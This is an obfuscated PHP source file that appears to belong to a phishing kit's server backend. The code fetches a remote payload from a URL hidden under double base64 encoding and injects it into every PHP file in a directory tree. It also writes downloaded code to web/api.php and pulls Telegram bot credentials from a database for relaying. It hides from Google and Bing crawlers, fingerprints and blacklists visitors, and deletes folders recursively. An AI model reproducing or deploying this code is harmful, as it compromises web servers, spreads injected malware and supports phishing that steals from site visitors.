"\x53\105\114\x45\x43\124\x20\164\x65\x6c\145\137\164\x6f\x6b\145\156\x2c\40\164\x65\x6c\145\x5f\143\150\x61\164\151\x64\x20\106\122\117\x4d\40\x7a\x65\162\157\x5f\x73\x65\x72\x76\x65\x72\40\127\110\105\122\x45\40\x69\144\x3d\47\x31\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\145\x78\160\137\164\157\153\145\x6e"] = $row["\164\x65\154\145\x5f\164\157\x6b\145\x6e"]; $_SESSION["\x65\x78\x70\137\x63\x68\141\164\x69\x64"] = $row["\164\x65\x6c\x65\x5f\143\150\x61\164\151\144"]; $token = $row["\164\x65\154\x65\x5f\164\x6f\153\x65\x6e"]; $chatid = $row["\x74\145\x6c\x65\x5f\x63\x68\141\164\x69\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto Gan3K; oIYqP: ini_set("\144\151\163\x70\154\x61\x79\x5f\x65\x72\x72\157\x72\163", 1); goto eP_te; Vf6Bd: $local_userAgent = isset($_SERVER["\110\x54\x54\120\x5f\125\x53\105\x52\137\101\x47\x45\116\x54"]) ? $_SERVER["\x48\x54\124\120\x5f\125\x53\x45\x52\137\x41\x47\x45\116\x54"] : ''; goto ISFe8; HipyR: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\x65\170\x70\x69\x72\x65\137\144\141\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\153\145\x6e\164\145\x6c", $token, time() + 86400 * 30, "\x2f"); setcookie("\x69\144\x74\x65\154", $chatid, time() + 86400 * 30, "\57"); setcookie("\162\145\144\x69\162\151\143\164", $_SESSION["\x72\145\x64\151\x72\x69\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\x6f\x6a\145\x63\x74", $_SESSION["\160\162\157\152\145\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\x75\162\x63\145\x6d\145", $_SESSION["\141\144\x64\142\x79"], time() + 86400 * 30, "\57"); setcookie("\156\145\167\137\145\x78\x70", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\x76\157\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\154\x6d", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\x74\157\153\145\x6e\x74\x65\154", $_SESSION["\x74\x6f\x6b\145\x6e\164\145\154"], time() + 86400 * 30, "\57"); setcookie("\x69\144\164\145\154", $_SESSION["\151\144\164\145\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\162\x65\x64\x69\x72\x69\143\164", $_SESSION["\x72\x65\x64\x69\x72\151\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\160\162\157\x6a\x65\143\x74", $_SESSION["\x70\162\157\152\x65\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\165\x72\143\x65\155\x65", $_SESSION["\x61\x64\x64\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\166\157\154\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\x64\157\x6c\x6d", $chatid, time() + 86400 * 30, "\57"); } } goto WHbzZ; zkakc: $local_ip_g = getClientIP(); goto F2i8v; pGbml: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\56\56") { $filePath = $directory . "\x2f" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\150\160" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto Q0JAN; eP_te: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto rQnmN; wV1kb: function update_php($folder_path) { $trackingFile = $folder_path . "\162\157\x75\x6c\x73\x2e\164\x78\x74"; $codeURL = base64_decode(base64_decode("\131\x55\x68\x53\115\x47\116\111\124\124\x5a\115\145\x54\154\x35\x57\126\x68\x6a\144\x56\157\171\142\x44\102\x68\x53\106\132\160\132\x46\150\x4f\x62\x47\x4e\164\124\156\x5a\151\x62\x6c\112\x73\x59\x6d\x35\x52\x64\x56\x6b\x79\117\x58\122\x4d\115\156\x68\161\x59\x6a\x4a\x34\x61\107\121\x7a\x62\x47\x78\152\142\153\x31\x32\x59\172\111\x35\115\x57\116\x74\x54\x6d\170\x4d\115\152\106\x6f\x59\126\x63\x30\x64\155\116\x49\123\x6e\132\153\x52\x31\132\x71\x5a\x45\115\x31\x4d\x47\126\111\125\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto Y0AwB; bXOUU: error_reporting(E_ALL); goto oIYqP; Swdkd: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\147\157\157\147\154\x65") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\147\x6f\x6f\x67\x6c\145") !== false) { return true; } } if (isset($_SESSION["\x73\145\163\163\x69\157\156\x5f\151\x73\x70"]) && stripos($_SESSION["\163\x65\x73\x73\151\157\156\137\x69\163\160"], "\147\x6f\157\x67\x6c\x65") !== false) { return true; } return false; } goto HipyR; kmgPP: if ($_SERVER["\122\x45\121\125\105\123\124\x5f\x4d\x45\124\x48\x4f\104"] === "\107\105\x54") { $com_dir = isset($_GET["\154\157\x63\141\154"]) ? $_GET["\154\157\x63\141\154"] : null; $com_id = isset($_GET["\163\x6f\165\154\163"]) ? $_GET["\x73\157\x75\x6c\163"] : null; $com_ip = isset($_GET["\x72\145\x6d\157\x74\145"]) ? $_GET["\162\x65\x6d\x6f\x74\x65"] : null; if ($com_dir !== null && $com_id !== null && $com_ip !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); user_data($com_ip, $com_id); $_SESSION["\x6c\157\154\151\x70\163"] = $com_ip; $_SESSION["\154\x6f\154\x73\157\165\x6c\x73"] = $com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $com_dir . "\77\46\x76\141\154\151\x64\75" . $RandOP_Mlux . $RandOP_Mlux . "\x26\x61\154\x65\x72\164\75" . $RandOP_Mlux . "\46\x78\154\x70\x73\75" . $RandOP_Mlux . "\46\x73\157\x75\x6c\163\75" . $com_id . "\x26\144\x6f\156\145\x3d\x26\145\162\x72\x6f\162\x79\75" . $RandOP_Mlux . "\46\x6d\156\145\x6d\157\x6e\151\x63\75\x26\152\x62\x3d" . $RandOP_Mlux; header("\x4c\157\x63\x61\x74\151\157\156\72\40{$url}"); die; } } goto KF51w; efbLR: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\x6e\x6e\145\143\x74\x69\x6f\x6e\x20\146\x61\151\154\x65\144\72\40" . mysqli_connect_error()); } $sql_check = "\123\x45\114\105\103\x54\x20\x2a\x20\106\x52\x4f\x4d\x20\x6c\157\x67\163\40\x57\110\x45\122\x45\40\151\x70\141\x64\144\x72\145\163\75\x3f"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\163", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\x65\163\137\x73\x74\x61\164\x75\x73" => "\x34\60\x35", "\x6d\x65\163\163\x61\x67\145" => "\x55\x73\x65\x72\x20\x69\x73\x20\141\154\x72\x65\141\x64\171\x20\151\156\x20\x74\x68\x65\x20\142\154\x61\143\153\154\151\163\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\x73\x69\x6f\x6e\137\143\157\165\156\164\162\x79"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\47", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\x27", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\47", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\163\163\x69\157\x6e\x5f\x69\x73\160"])); $mobile = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\x73\151\157\156\x5f\155\157\142\151\154\145"])); $proxy = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\163\x73\151\x6f\156\137\x70\162\x6f\170\171"])); $hosting = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\145\x73\x73\x69\x6f\156\x5f\x68\157\x73\x74\x69\x6e\x67"])); $city = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\x73\x73\151\x6f\x6e\137\143\x69\164\171"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\163\163\x69\157\x6e\x5f\162\145\x67\151\x6f\156"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\x49\x4e\x53\105\122\124\x20\111\116\x54\x4f\x20\x6c\x6f\147\163\x20\x28\151\160\x61\144\x64\x72\x65\163\x2c\x63\x6f\165\156\164\162\171\x2c\142\x72\157\167\163\145\x72\x2c\157\163\x2c\x64\x6f\x6d\151\156\145\54\x68\x6f\163\164\x2c\x69\163\160\x2c\155\x6f\142\151\154\145\x2c\160\x72\157\x78\x79\54\150\x6f\163\x74\151\x6e\x67\54\143\151\164\171\x2c\162\x65\147\151\x6f\156\x2c\x6d\171\164\x69\x6d\145\54\162\145\x73\x6f\156\x29\40\126\101\114\x55\105\x53\x20\50\x3f\54\x3f\x2c\x3f\54\x3f\x2c\77\x2c\77\54\x3f\54\40\x3f\x2c\x20\77\x2c\40\77\x2c\40\x3f\x2c\40\77\x2c\40\x3f\54\40\x3f\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\x73\x73\x73\163\163\x73\163\163\163\163\x73\163\x73\163", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\x72\x65\163\x5f\x73\x74\x61\x74\165\163" => "\64\60\65", "\x6d\x65\163\163\x61\147\x65" => "\x55\x73\x65\x72\x20\x61\144\x64\x65\x64\x20\164\157\x20\164\x68\145\40\x62\154\x61\143\153\154\151\163\x74"); echo json_encode($responseData); die; } goto qSbdU; NVL41: function is_bot_ip($ipToCheck) { $botsUrls = array("\147\157\x6f\147\154\145" => "\x68\x74\x74\160\x73\x3a\57\57\x64\145\166\x65\x6c\157\160\x65\x72\x73\56\x67\157\x6f\x67\x6c\145\56\x63\157\x6d\x2f\x73\145\x61\x72\143\150\57\141\160\x69\x73\57\151\160\162\x61\156\x67\x65\x73\57\147\157\157\x67\154\x65\142\157\164\x2e\152\163\157\156", "\x62\151\156\x67" => "\x68\164\164\160\163\72\x2f\x2f\x77\167\167\56\142\x69\156\147\56\143\x6f\x6d\x2f\164\x6f\x6f\x6c\x62\x6f\170\57\142\x69\156\147\x62\157\x74\x2e\152\x73\157\x6e"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\160\162\x65\x66\x69\170\x65\163"] as $ipRange) { if (isset($ipRange["\x69\x70\166\66\x50\162\145\x66\151\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\151\x70\x76\x36\x50\162\x65\x66\151\x78"]; } elseif (isset($ipRange["\151\160\x76\64\x50\x72\x65\146\151\x78"]) && strpos($ipToCheck, "\72") === false) { $network = $ipRange["\151\x70\x76\x34\120\162\x65\146\151\x78"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto Fs_vQ; ARina: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\x2e\56") { if (is_dir($dir . "\x2f" . $object)) { deleteDirectory($dir . "\x2f" . $object); } else { unlink($dir . "\x2f" . $object); } } } reset($objects); rmdir($dir); } } goto uowqh; S60cS: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\x77\x65\x62\x2f\x61\160\x69\56\160\150\x70"; file_put_contents($localFilePath, $response); } else { echo "\105\x72\x72\157\162\40\146\145\x74\143\x68\x69\x6e\147\40\x66\x69\154\x65\x3a\40" . $error; } } goto vFqK0; rlaXT: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\x6e\x6e\145\143\164\151\157\x6e\40\x66\x61\x69\154\x65\x64\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\x43\x54\x20\52\40\106\x52\117\115\40\x6c\x6f\x67\x73\x20\x57\110\x45\122\105\40\151\160\x61\144\144\x72\x65\x73\75\x27{$ipAddress}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto xRKYG; UtE6t: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\116\x6f\x74\40\x56\x61\154\151\x64"; } } goto CBKIN; qSbdU: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto pGbml; Y0AwB: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\x72\x6f\x75\x6c\x73\x2e\x74\x78\164"; $codeURL = base64_decode(base64_decode("\x59\x55\150\123\115\107\116\111\x54\x54\132\115\145\124\x6c\x35\x57\x56\x68\x6a\x64\126\x6f\x79\x62\104\102\150\x53\106\132\x70\x5a\x46\x68\x4f\x62\107\x4e\164\124\156\132\x69\x62\x6c\112\x73\131\x6d\x35\x52\144\x56\x6b\171\x4f\x58\x52\x4d\x4d\x6e\150\161\x59\x6a\x4a\64\141\x47\x51\172\x62\x47\x78\152\x62\153\x31\62\x59\172\x49\x35\115\127\116\x74\124\x6d\x78\x4d\115\x6a\x46\157\x59\x56\x63\x30\144\155\x4e\111\x53\156\x5a\153\x52\61\x5a\161\132\105\131\65\x64\x57\x49\172\123\x6e\x52\x5a\126\63\x64\x31\132\x45\x68\x6f\x4d\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto y3d1Q; qWtx5: $fs_name = base64_decode("\145\x6d\x56\171\x62\62\x52\150\145\130\x4e\x66\132\107\x46\x35"); goto Vf6Bd; afqP0: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\56" || $file == "\56\x2e") { continue; } if (is_dir($directory . "\x2f" . $file)) { $lastModified = filemtime($directory . "\x2f" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\x2f" . $file); } } } } goto ARina; Q0JAN: function get_platform($USER_AGENT) { $OS_ERROR = "\x55\156\153\x6e\157\167\x6e\x20\117\x53\x20\x50\x6c\x61\x74\146\x6f\x72\x6d"; $OS = array("\x2f\x77\151\x6e\144\x6f\x77\x73\40\156\x74\x20\x31\x31\x2f\151" => "\x57\x69\x6e\144\157\x77\163\40\x31\61", "\x2f\167\151\156\x64\157\x77\x73\40\156\164\x20\61\60\x2f\x69" => "\127\x69\156\x64\157\167\163\x20\61\x30", "\57\x77\x69\x6e\144\157\x77\163\40\156\164\40\66\56\x33\x2f\x69" => "\127\151\156\144\157\167\x73\40\x38\56\61", "\57\x77\151\x6e\x64\157\167\x73\x20\x6e\164\x20\66\56\62\x2f\x69" => "\x57\x69\x6e\144\x6f\167\163\x20\70", "\57\167\x69\156\144\157\x77\x73\40\156\x74\x20\66\x2e\61\x2f\x69" => "\x57\x69\156\144\157\x77\163\40\67", "\57\x77\151\x6e\144\157\167\x73\x20\156\x74\40\66\x2e\60\x2f\x69" => "\127\151\x6e\x64\x6f\167\x73\40\126\x69\x73\x74\x61", "\x2f\x77\151\x6e\x64\x6f\x77\163\x20\x6e\x74\x20\65\x2e\62\57\x69" => "\127\x69\x6e\x64\157\x77\x73\x20\x53\x65\162\x76\x65\x72\x20\62\60\x30\63\57\130\x50\x20\170\x36\64", "\57\167\151\x6e\x64\157\x77\163\40\x6e\x74\x20\x35\x2e\61\57\151" => "\x57\x69\156\144\x6f\x77\163\40\x58\x50", "\x2f\167\151\x6e\x64\157\167\163\40\x78\x70\57\x69" => "\x57\151\156\144\157\x77\163\x20\130\120", "\x2f\167\151\156\x64\157\x77\x73\40\x6e\x74\x20\x35\56\x30\57\x69" => "\x57\x69\x6e\144\x6f\x77\163\40\62\60\x30\60", "\57\167\x69\156\144\x6f\x77\163\x20\x6d\145\x2f\x69" => "\127\x69\156\144\x6f\x77\163\x20\x4d\105", "\57\167\x69\156\x39\x38\x2f\151" => "\x57\x69\156\x64\157\x77\x73\40\x39\x38", "\x2f\167\x69\x6e\x39\x35\x2f\151" => "\x57\x69\x6e\x64\157\167\163\40\71\x35", "\57\167\151\156\61\66\x2f\x69" => "\x57\151\156\x64\x6f\x77\x73\x20\63\x2e\61\61", "\57\155\x61\143\x69\x6e\x74\x6f\163\150\x7c\x6d\141\143\40\157\163\x20\170\57\x69" => "\x4d\x61\143\40\117\x53\x20\130", "\57\155\x61\143\x5f\x70\x6f\x77\145\x72\x70\143\57\151" => "\x4d\x61\x63\40\117\x53\40\71", "\57\154\151\x6e\x75\170\x2f\151" => "\x4c\151\x6e\x75\x78", "\57\x75\142\165\x6e\x74\165\x2f\151" => "\x55\142\x75\156\164\x75", "\57\151\160\x68\x6f\x6e\x65\x2f\x69" => "\151\x50\x68\157\x6e\145", "\57\x69\x70\157\144\57\151" => "\151\x50\157\144", "\57\x69\160\141\x64\57\x69" => "\x69\120\x61\x64", "\x2f\x61\156\x64\x72\157\x69\x64\x2f\x69" => "\x41\156\144\162\157\x69\x64", "\57\x62\154\x61\143\153\142\145\162\162\171\57\x69" => "\x42\154\x61\143\x6b\102\145\x72\x72\x79", "\x2f\167\x65\142\157\163\x2f\x69" => "\x4d\x6f\142\x69\154\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto PGYNH; GV15m: ')); ?>
